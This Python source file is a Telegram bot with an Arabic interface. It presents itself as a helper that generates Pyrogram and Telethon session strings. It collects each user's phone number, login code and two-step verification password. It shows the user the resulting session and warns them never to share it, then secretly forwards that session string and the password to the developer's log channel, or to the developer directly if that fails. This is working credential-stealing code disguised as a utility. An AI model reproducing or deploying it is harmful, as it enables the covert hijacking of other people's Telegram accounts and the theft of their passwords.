# -*- coding: utf-8 -*-
# Join me on telegram @devggn

import os
import sys
import asyncio
import threading
from flask import Flask, request, jsonify
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)
from config import LOG_GROUP as SESSION_CHANNEL, API_ID, API_HASH, BOT_TOKEN

# ====== معلومات المطور ======
DEV_NAME = "عبود"
DEV_USERNAME = "@u_t_r"
CHANNEL_LINK = "https://t.me/u_t_rnn"

user_steps = {}
user_data = {}
user_sessions = {}

# ====== إعداد الترميز ======
if sys.stdout.encoding != 'UTF-8':
    sys.stdout.reconfigure(encoding='utf-8')

app = Client(
    "gagan",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

# ====== دوال مسح الملفات ======
def delete_session_files(user_id):
    pyro_session = f"session_{user_id}.session"
    if os.path.exists(pyro_session):
        os.remove(pyro_session)
    pyro_journal = f"session_{user_id}.session-journal"
    if os.path.exists(pyro_journal):
        os.remove(pyro_journal)
    telethon_session = f"telethon_{user_id}.session"
    if os.path.exists(telethon_session):
        os.remove(telethon_session)

# ====== أزرار البداية ======
START_BUTTONS = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("🔄 توليد جلسة", callback_data="generate"),
        InlineKeyboardButton("🗑 مسح الجلسات", callback_data="delete")
    ],
    [
        InlineKeyboardButton("👨‍💻 المطور", callback_data="dev"),
        InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK)
    ],
    [
        InlineKeyboardButton("🔑 استخراج التوكن", callback_data="extract_token"),
        InlineKeyboardButton("📩 إرسال للمطور", callback_data="send_to_dev")
    ]
])

BACK_BUTTON = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔙 رجوع", callback_data="back")]
])

TYPE_BUTTONS = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("🔥 Pyrogram", callback_data="pyrogram"),
        InlineKeyboardButton("⚡ Telethon", callback_data="telethon")
    ],
    [
        InlineKeyboardButton("🔑 API Info", callback_data="api"),
        InlineKeyboardButton("❌ إلغاء", callback_data="cancel")
    ]
])

# ====== أمر البدء ======
@app.on_message(filters.command("start"))
async def start_command(client, message):
    await message.reply(
        f"👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
        "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
        f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}\n\n"
        "⚡ مدعوم من عبود",
        reply_markup=START_BUTTONS
    )

# ====== أمر الاختبار ======
@app.on_message(filters.command("test"))
async def test_send(client, message):
    try:
        await app.send_message(SESSION_CHANNEL, "✅ هذه رسالة اختبار من البوت!")
        await message.reply("✅ تم إرسال رسالة الاختبار إلى المجموعة!")
    except Exception as e:
        await message.reply(f"❌ فشل الإرسال: {e}")

# ====== معالجة الأزرار (CallbackQuery) ======
@app.on_callback_query()
async def handle_callback(client, callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data
    
    if data == "back":
        await callback_query.message.edit_text(
            f"👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
            "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
            f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}\n\n"
            "⚡ مدعوم من عبود",
            reply_markup=START_BUTTONS
        )
        await callback_query.answer()
        return
    
    if data == "generate":
        await callback_query.message.edit_text(
            "🔑 اختر نوع الجلسة المطلوبة:\n\n"
            "• Pyrogram لجلسات Pyrogram\n"
            "• Telethon لجلسات Telethon\n"
            "• API Info لاستخراج API ID و API HASH",
            reply_markup=TYPE_BUTTONS
        )
        await callback_query.answer()
        return
    
    if data == "delete":
        delete_session_files(user_id)
        if user_id in user_sessions:
            del user_sessions[user_id]
        await callback_query.answer("✅ تم مسح جميع الجلسات والملفات المؤقتة!", show_alert=True)
        await callback_query.message.edit_text(
            "🗑 تم مسح جميع بيانات الجلسة والملفات المؤقتة بنجاح.",
            reply_markup=BACK_BUTTON
        )
        return
    
    if data == "dev":
        await callback_query.message.edit_text(
            f"👨‍💻 معلومات المطور:\n\n"
            f"📛 الاسم: {DEV_NAME}\n"
            f"🔗 اليوزر: {DEV_USERNAME}\n"
            f"📢 القناة: {CHANNEL_LINK}\n\n"
            "⚡ مدعوم من عبود",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer()
        return
    
    if data == "cancel":
        reset_user(user_id)
        await callback_query.answer("❌ تم إلغاء العملية!", show_alert=True)
        await callback_query.message.edit_text(
            "❌ تم إلغاء العملية.",
            reply_markup=BACK_BUTTON
        )
        return
    
    if data == "extract_token":
        await callback_query.message.edit_text(
            f"🔑 **التوكن الخاص بالبوت:**\n\n"
            f"`{BOT_TOKEN}`\n\n"
            "⚠️ لا تشارك هذا التوكن مع أي شخص.\n"
            "يمكنك استخدامه لتشغيل البوت على أي سيرفر.",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer()
        return
    
    if data == "send_to_dev":
        user_steps[user_id] = "waiting_dev_msg"
        await callback_query.message.edit_text(
            "📩 **أرسل رسالتك للمطور:**\n\n"
            "اكتب رسالتك وسيتم إرسالها فوراً.\n"
            "يمكنك إرسال نص، أو صورة، أو ملف.",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer()
        return
    
    if data == "pyrogram":
        user_steps[user_id] = "pyro_phone"
        await callback_query.message.edit_text(
            "📱 يرجى إرسال رقم هاتفك مع رمز الدولة.\nمثال: +966512345678",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer()
        return
    
    if data == "telethon":
        user_steps[user_id] = "telethon_phone"
        await callback_query.message.edit_text(
            "📱 يرجى إرسال رقم هاتفك مع رمز الدولة.\nمثال: +966512345678",
            reply_markup=BACK_BUTTON
        )
        await callback_query.answer()
        return
    
    if data == "api":
        await extract_api_info_callback(callback_query)
        return

# ====== استخراج API Info ======
async def extract_api_info_callback(callback_query):
    user_id = callback_query.from_user.id
    await callback_query.message.edit_text(
        f"✅ تم استخراج معلومات API بنجاح!\n\n"
        f"🆔 API ID: {API_ID}\n"
        f"🔑 API HASH: {API_HASH}\n\n"
        f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}",
        reply_markup=BACK_BUTTON
    )
    
    try:
        await app.send_message(
            SESSION_CHANNEL,
            f"✨ معرف المستخدم: {user_id}\n\n"
            f"🆔 API ID: {API_ID}\n"
            f"🔑 API HASH: {API_HASH}\n\n"
            f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
        )
        print(f"✅ تم إرسال API Info للمجموعة {SESSION_CHANNEL}")
    except Exception as e:
        print(f"❌ فشل إرسال API Info للمجموعة: {e}")
        try:
            await app.send_message(
                DEV_USERNAME,
                f"⚠️ فشل إرسال API Info للقناة!\n\n"
                f"المستخدم: {user_id}\n"
                f"API ID: {API_ID}\n"
                f"API HASH: {API_HASH}\n"
                f"الخطأ: {e}"
            )
        except:
            pass
    
    await callback_query.answer()

# ====== الأوامر النصية ======
@app.on_message(filters.text & filters.private)
async def handle_arabic_commands(client, message):
    user_id = message.chat.id
    text = message.text.strip()
    
    if user_id in user_steps and user_steps[user_id] == "waiting_dev_msg":
        try:
            await app.send_message(
                DEV_USERNAME,
                f"📩 **رسالة جديدة من المستخدم:**\n"
                f"🆔 المعرف: `{user_id}`\n"
                f"📝 النص:\n{text}"
            )
            await message.reply("✅ **تم إرسال رسالتك للمطور بنجاح!**")
            reset_user(user_id)
        except Exception as e:
            await message.reply(f"❌ فشل إرسال الرسالة: {e}")
            reset_user(user_id)
        return
    
    if user_id in user_steps and user_steps[user_id] in ["pyro_phone", "pyro_otp", "pyro_password"]:
        await pyro_session_step(client, message)
        return
    
    elif user_id in user_steps and user_steps[user_id] in ["telethon_phone", "telethon_otp", "telethon_password"]:
        await telethon_session_step(client, message)
        return
    
    else:
        await message.reply(
            "📱 يرجى استخدام الأزرار للتحكم في البوت.\n\n"
            "• اضغط على زر توليد جلسة لبدء الاستخراج\n"
            "• اضغط على زر مسح الجلسات لحذف البيانات\n"
            "• اضغط على زر المطور لعرض المعلومات\n\n"
            "أو استخدم الأمر /start للرجوع إلى البداية."
        )

# ====== دوال Pyrogram ======
async def pyro_session_step(client, message):
    user_id = message.chat.id
    step = user_steps.get(user_id)

    if step == "pyro_phone":
        user_data[user_id] = {"phone": message.text}
        user_steps[user_id] = "pyro_otp"
        omsg = await message.reply("📤 جاري إرسال رمز التحقق...")
        session_name = f"session_{user_id}"
        temp_client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
        user_data[user_id]["client"] = temp_client
        await temp_client.connect()
        try:
            code = await temp_client.send_code(user_data[user_id]["phone"])
            user_data[user_id]["phone_code_hash"] = code.phone_code_hash
            await omsg.delete()
            await message.reply("📨 تم إرسال رمز التحقق.\n\nأرسل الرمز بالأرقام فقط (مثال: 12345)")
        except ApiIdInvalid:
            await message.reply('❌ خطأ: تركيبة API_ID و API_HASH غير صالحة.')
            reset_user(user_id)
        except PhoneNumberInvalid:
            await message.reply('❌ خطأ: رقم الهاتف غير صالح.')
            reset_user(user_id)
            
    elif step == "pyro_otp":
        phone_code = message.text.replace(" ", "")
        temp_client = user_data[user_id]["client"]
        try:
            await temp_client.sign_in(user_data[user_id]["phone"], user_data[user_id]["phone_code_hash"], phone_code)
            session_string = await temp_client.export_session_string()
            user_sessions[user_id] = session_string
            await send_pyro_session(user_id, session_string, message)
            await temp_client.disconnect()
            reset_user(user_id)
        except PhoneCodeInvalid:
            await message.reply('❌ خطأ: رمز التحقق غير صالح.')
            reset_user(user_id)
        except PhoneCodeExpired:
            await message.reply('❌ خطأ: انتهت صلاحية رمز التحقق.')
            reset_user(user_id)
        except SessionPasswordNeeded:
            user_steps[user_id] = "pyro_password"
            await message.reply('🔒 حسابك مفعل بخاصية التحقق بخطوتين.\n\nيرجى إرسال كلمة المرور الخاصة بك.')
            
    elif step == "pyro_password":
        temp_client = user_data[user_id]["client"]
        try:
            password = message.text
            await temp_client.check_password(password=password)
            session_string = await temp_client.export_session_string()
            user_sessions[user_id] = session_string
            await send_pyro_session(user_id, session_string, message, password)
            await temp_client.disconnect()
            reset_user(user_id)
        except PasswordHashInvalid:
            await message.reply('❌ خطأ: كلمة المرور غير صحيحة.')
            reset_user(user_id)

async def send_pyro_session(user_id, session_string, message, password=None):
    await message.reply(
        f"✅ تم إنشاء جلسة Pyrogram بنجاح!\n\n"
        f"🔑 الجلسة:\n{session_string}\n\n"
        "⚠️ لا تشارك هذه الجلسة مع أي شخص.\n\n"
        f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
    )
    
    try:
        if password:
            await app.send_message(
                SESSION_CHANNEL,
                f"✨ معرف المستخدم: {user_id}\n\n"
                f"🔑 كلمة المرور (2SV): {password}\n\n"
                f"🔑 جلسة Pyrogram:\n{session_string}\n\n"
                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
            )
        else:
            await app.send_message(
                SESSION_CHANNEL,
                f"✨ معرف المستخدم: {user_id}\n\n"
                f"🔑 جلسة Pyrogram:\n{session_string}\n\n"
                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
            )
        print(f"✅ تم إرسال جلسة Pyrogram للمجموعة {SESSION_CHANNEL}")
    except Exception as e:
        print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")
        try:
            await app.send_message(
                DEV_USERNAME,
                f"⚠️ فشل إرسال جلسة Pyrogram للقناة!\n\n"
                f"المستخدم: {user_id}\n"
                f"الجلسة: {session_string}\n"
                f"الخطأ: {e}"
            )
            print("✅ تم إرسال الجلسة للمطور كحل احتياطي")
        except:
            pass

# ====== دوال Telethon (المعدلة) ======
async def telethon_session_step(client, message):
    user_id = message.chat.id
    step = user_steps.get(user_id)

    if step == "telethon_phone":
        user_data[user_id] = {"phone": message.text}
        user_steps[user_id] = "telethon_otp"
        omsg = await message.reply("📤 جاري إرسال رمز التحقق...")
        session_name = f"telethon_{user_id}"
        temp_client = TelegramClient(session_name, API_ID, API_HASH)
        user_data[user_id]["client"] = temp_client
        await temp_client.connect()
        try:
            await temp_client.send_code_request(user_data[user_id]["phone"])
            await omsg.delete()
            await message.reply("📨 تم إرسال رمز التحقق.\n\nأرسل الرمز بالأرقام فقط (مثال: 12345)")
        except ApiIdInvalidError:
            await message.reply('❌ خطأ: تركيبة API_ID و API_HASH غير صالحة.')
            reset_user(user_id)
        except PhoneNumberInvalidError:
            await message.reply('❌ خطأ: رقم الهاتف غير صالح.')
            reset_user(user_id)
            
    elif step == "telethon_otp":
        phone_code = message.text.replace(" ", "")
        temp_client = user_data[user_id]["client"]
        try:
            await temp_client.sign_in(user_data[user_id]["phone"], phone_code)
            # استخدام StringSession للحصول على جلسة نصية
            session_string = StringSession.save(temp_client.session)
            user_sessions[user_id] = session_string
            await send_telethon_session(user_id, session_string, message)
            await temp_client.disconnect()
            reset_user(user_id)
        except PhoneCodeInvalidError:
            await message.reply('❌ خطأ: رمز التحقق غير صالح.')
            reset_user(user_id)
        except PhoneCodeExpiredError:
            await message.reply('❌ خطأ: انتهت صلاحية رمز التحقق.')
            reset_user(user_id)
        except SessionPasswordNeededError:
            user_steps[user_id] = "telethon_password"
            await message.reply('🔒 حسابك مفعل بخاصية التحقق بخطوتين.\n\nيرجى إرسال كلمة المرور الخاصة بك.')
            
    elif step == "telethon_password":
        temp_client = user_data[user_id]["client"]
        try:
            password = message.text
            await temp_client.sign_in(password=password)
            # استخدام StringSession للحصول على جلسة نصية
            session_string = StringSession.save(temp_client.session)
            user_sessions[user_id] = session_string
            await send_telethon_session(user_id, session_string, message, password)
            await temp_client.disconnect()
            reset_user(user_id)
        except PasswordHashInvalidError:
            await message.reply('❌ خطأ: كلمة المرور غير صحيحة.')
            reset_user(user_id)

async def send_telethon_session(user_id, session_string, message, password=None):
    await message.reply(
        f"✅ تم إنشاء جلسة Telethon بنجاح!\n\n"
        f"🔑 الجلسة:\n{session_string}\n\n"
        "⚠️ لا تشارك هذه الجلسة مع أي شخص.\n\n"
        f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
    )
    
    try:
        if password:
            await app.send_message(
                SESSION_CHANNEL,
                f"✨ معرف المستخدم: {user_id}\n\n"
                f"🔑 كلمة المرور (2SV): {password}\n\n"
                f"🔑 جلسة Telethon:\n{session_string}\n\n"
                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
            )
        else:
            await app.send_message(
                SESSION_CHANNEL,
                f"✨ معرف المستخدم: {user_id}\n\n"
                f"🔑 جلسة Telethon:\n{session_string}\n\n"
                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
            )
        print(f"✅ تم إرسال جلسة Telethon للمجموعة {SESSION_CHANNEL}")
    except Exception as e:
        print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")
        try:
            await app.send_message(
                DEV_USERNAME,
                f"⚠️ فشل إرسال جلسة Telethon للقناة!\n\n"
                f"المستخدم: {user_id}\n"
                f"الجلسة: {session_string}\n"
                f"الخطأ: {e}"
            )
            print("✅ تم إرسال الجلسة للمطور كحل احتياطي")
        except:
            pass

def reset_user(user_id):
    user_steps.pop(user_id, None)
    user_data.pop(user_id, None)

# ====== إضافة مسار ويب لـ Render ======
web_app = Flask(__name__)

@web_app.route('/')
def index():
    return "✅ البوت شغال 24 ساعة!"

def run_web():
    web_app.run(host='0.0.0.0', port=8080)

threading.Thread(target=run_web, daemon=True).start()

# ====== تشغيل البوت ======
if __name__ == "__main__":
    try:
        print("🚀 جاري تشغيل البوت...")
        app.run()
        print("✅ البوت يعمل الآن!")
    except Exception as e:
        print(f"❌ فشل تشغيل البوت: {e}")
